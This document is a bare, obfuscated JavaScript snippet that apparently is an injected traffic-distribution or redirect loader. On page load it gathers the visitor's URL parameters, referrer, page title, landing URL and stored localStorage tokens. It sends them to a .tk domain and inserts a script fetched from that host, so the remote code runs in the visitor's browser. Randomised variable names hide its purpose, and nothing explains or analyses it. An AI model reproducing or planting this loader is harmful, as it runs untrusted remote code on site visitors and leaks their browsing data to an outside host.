 (function() {
    var name = '_kSwFrb9kTwvtk3Km';
    if (!window._kSwFrb9kTwvtk3Km) {
        window._kSwFrb9kTwvtk3Km = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://whiranjafusboooo.tk/Sx3dVZ',
            P_PATH: 'https://whiranjafusboooo.tk/fec84ce/postback',
        };
    }
    const _6PnPYPdvz5jd4j27 = localStorage.getItem('config');
    if (typeof _6PnPYPdvz5jd4j27 !== 'undefined' && _6PnPYPdvz5jd4j27 !== null) {
        var _L5g9p4ZcR1WGkmQ2 = JSON.parse(_6PnPYPdvz5jd4j27);
        var _KmjqdJWXYKvbcfct = Math.round(+new Date()/1000);
        if (_L5g9p4ZcR1WGkmQ2.created_at + window._kSwFrb9kTwvtk3Km.ttl < _KmjqdJWXYKvbcfct) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _WqHBZDxyyG8CxZzJ = localStorage.getItem('subId');
    var _8N1pZjm9JZ2gC6yq = localStorage.getItem('token');
    var _5r8DSSVyndPhCxwj = '?return=js.client';
        _5r8DSSVyndPhCxwj += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _5r8DSSVyndPhCxwj += '&se_referrer=' + encodeURIComponent(document.referrer);
        _5r8DSSVyndPhCxwj += '&default_keyword=' + encodeURIComponent(document.title);
        _5r8DSSVyndPhCxwj += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _5r8DSSVyndPhCxwj += '&name=' + encodeURIComponent(name);
        _5r8DSSVyndPhCxwj += '&host=' + encodeURIComponent(window._kSwFrb9kTwvtk3Km.R_PATH);
    if (typeof _WqHBZDxyyG8CxZzJ !== 'undefined' && _WqHBZDxyyG8CxZzJ && window._kSwFrb9kTwvtk3Km.unique) {
        _5r8DSSVyndPhCxwj += '&sub_id=' + encodeURIComponent(_WqHBZDxyyG8CxZzJ);
    }
    if (typeof _8N1pZjm9JZ2gC6yq !== 'undefined' && _8N1pZjm9JZ2gC6yq && window._kSwFrb9kTwvtk3Km.unique) {
        _5r8DSSVyndPhCxwj += '&token=' + encodeURIComponent(_8N1pZjm9JZ2gC6yq);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._kSwFrb9kTwvtk3Km.R_PATH + _5r8DSSVyndPhCxwj;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
